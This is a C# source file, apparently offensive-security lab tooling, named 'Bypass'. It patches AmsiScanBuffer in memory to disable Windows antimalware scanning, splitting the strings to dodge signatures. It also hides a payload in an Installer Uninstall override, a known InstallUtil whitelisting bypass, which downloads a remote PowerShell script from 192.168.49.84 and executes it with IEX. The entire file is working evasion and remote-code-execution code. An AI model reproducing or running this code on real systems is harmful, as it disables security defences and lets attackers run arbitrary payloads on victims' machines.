using System;
using System.Management.Automation;
using System.Management.Automation.Runspaces;
using System.Configuration.Install;
using System.Runtime.InteropServices;

namespace Bypass
{
    class Program
    {

        
        //implement required kernel32.dll functions 
        [DllImport("kernel32")]
        public static extern IntPtr LoadLibrary(string name);
        [DllImport("kernel32")]
        public static extern IntPtr GetProcAddress(IntPtr hModule, string procName);
        [DllImport("kernel32")]
        public static extern bool VirtualProtect(IntPtr lpAddress, UIntPtr dwSize, uint flNewProtect, out uint lpflOldProtect);
        [DllImport("kernel32.dll", EntryPoint = "RtlMoveMemory", SetLastError = false)]
        static extern void MoveMemory(IntPtr dest, IntPtr src, int size);

        public static int Patch()
        {
            //Get pointer for the amsi.dll        
            IntPtr TargetDLL = LoadLibrary("am" + "si" + ".dll");
            if (TargetDLL == IntPtr.Zero)
            {
                Console.WriteLine("ERROR: Could not retrieve amsi.dll pointer!");
                return 1;
            }

            //Get pointer for the AmsiScanBuffer function
            IntPtr AmsiScanBufrPtr = GetProcAddress(TargetDLL, "Amsi" + "ScanBuf" + "fer");
            if (AmsiScanBufrPtr == IntPtr.Zero)
            {
                Console.WriteLine("ERROR: Could not retrieve AmsiScanBuffer function pointer!");
                return 1;
            }

       
            UIntPtr dwSize = (UIntPtr)4;
            uint Zero = 0;

            
            if (!VirtualProtect(AmsiScanBufrPtr, dwSize, 0x40, out Zero))
            {
                Console.WriteLine("ERROR: Could not modify AmsiScanBuffer memory permissions!");
                return 1;
            }

            Byte[] Patch = { 0x31, 0xff, 0x90 }; 
            IntPtr unmanagedPointer = Marshal.AllocHGlobal(3);
            Marshal.Copy(Patch, 0, unmanagedPointer, 3);

            MoveMemory(AmsiScanBufrPtr + 0x001b, unmanagedPointer, 3);

            Console.WriteLine("Great success. AmsiScanBuffer patched! :)");
            return 0;
        }


        static void Main(string[] args)
        {
            Patch();
        }

    }

    [System.ComponentModel.RunInstaller(true)]
    public class Sample : System.Configuration.Install.Installer
    {
        public override void Uninstall(System.Collections.IDictionary savedState)
        {
            String cmd = "(New-Object System.Net.WebClient).DownloadString('http://192.168.49.84/injectorsimple.ps1') | IEX";
            Runspace rs = RunspaceFactory.CreateRunspace();
            rs.Open();

            PowerShell ps = PowerShell.Create();
            ps.Runspace = rs;

            ps.AddScript(cmd);

            ps.Invoke();

            rs.Close();
        }
    }
}